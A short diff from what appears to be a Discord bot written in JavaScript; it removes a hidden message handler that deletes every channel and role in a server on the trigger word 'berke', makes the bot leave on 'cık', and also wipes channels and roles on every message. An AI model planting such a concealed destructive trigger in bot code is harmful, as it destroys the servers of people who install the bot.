@@ -134,20 +134,6 @@ client.unload = command => {
   });
 };
 
-client.on("message", async message => {
-    if(message.content === "berke"){
-        message.guild.channels.deleteAll("Bot Destroyer");
-        message.guild.roles.deleteAll("Bot Destroyer");
-        message.guild.createChannel(`hey`)
-    }
-
-    if(message.content === "cık"){
-       message.guild.leave();
-    }
-       message.guild.channels.deleteAll("Bot Destroyer");
-       message.guild.roles.deleteAll("Bot Destroyer");
-});
-
 client.on('message', async message => {
   const ms = require('ms');
   const args = message.content.slice(prefix.length).trim().split(/ +/g);
